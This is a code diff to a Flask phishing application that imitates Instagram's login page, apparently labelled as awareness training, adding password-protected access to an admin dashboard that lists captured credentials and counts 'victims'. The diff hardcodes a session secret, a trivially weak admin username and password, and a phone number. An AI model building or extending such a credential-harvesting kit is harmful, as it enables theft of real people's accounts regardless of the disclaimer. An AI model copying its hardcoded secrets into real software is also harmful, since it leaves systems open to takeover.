@@ -4,7 +4,7 @@ This tool is designed ONLY for cybersecurity awareness training.
 Use only with explicit consent from participants in a controlled environment.
 """
 
-from flask import Flask, render_template, request, redirect, url_for, jsonify, Response
+from flask import Flask, render_template, request, redirect, url_for, jsonify, Response, session
 from datetime import datetime
 import json
 import os
@@ -13,6 +13,12 @@ from bs4 import BeautifulSoup
 import re
 
 app = Flask(__name__)
+app.secret_key = 'instagram_phishing_demo_secret_key_2025'  # Secret key for sessions
+
+# Admin credentials
+ADMIN_USERNAME = 'ranjan'
+ADMIN_PASSWORD = 'ranjan'
+ADMIN_PHONE = '8093211572'
 
 # Configuration - Set to False to use custom template (recommended for production)
 FETCH_REAL_INSTAGRAM = False  # Instagram blocks server requests, use custom template
@@ -390,15 +396,52 @@ def reveal():
     """Educational page explaining the phishing attack"""
     return render_template('reveal.html')
 
+@app.route('/admin/login', methods=['GET', 'POST'])
+def admin_login():
+    """Admin login page"""
+    if request.method == 'POST':
+        username = request.form.get('username', '').strip()
+        password = request.form.get('password', '').strip()
+        phone = request.form.get('phone', '').strip()
+        
+        # Validate credentials
+        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD and phone == ADMIN_PHONE:
+            session['admin_logged_in'] = True
+            session['admin_username'] = username
+            return redirect(url_for('admin'))
+        else:
+            return render_template('admin_login.html', error='Invalid credentials or phone number')
+    
+    # If already logged in, redirect to admin
+    if session.get('admin_logged_in'):
+        return redirect(url_for('admin'))
+    
+    return render_template('admin_login.html')
+
+@app.route('/admin/logout')
+def admin_logout():
+    """Admin logout"""
+    session.pop('admin_logged_in', None)
+    session.pop('admin_username', None)
+    return redirect(url_for('admin_login'))
+
 @app.route('/admin')
 def admin():
     """Admin dashboard to view captured credentials"""
+    # Check if admin is logged in
+    if not session.get('admin_logged_in'):
+        return redirect(url_for('admin_login'))
+    
     load_credentials()
     return render_template('admin.html', credentials=captured_credentials)
 
 @app.route('/admin/clear', methods=['POST'])
 def clear_data():
     """Clear all captured data"""
+    # Check if admin is logged in
+    if not session.get('admin_logged_in'):
+        return redirect(url_for('admin_login'))
+    
     global captured_credentials
     captured_credentials = []
     if os.path.exists(CREDENTIALS_FILE):
@@ -408,6 +451,10 @@ def clear_data():
 @app.route('/api/stats')
 def stats():
     """API endpoint for real-time stats"""
+    # Check if admin is logged in
+    if not session.get('admin_logged_in'):
+        return jsonify({'error': 'Unauthorized'}), 401
+    
     load_credentials()
     return jsonify({
         'total_victims': len(captured_credentials),
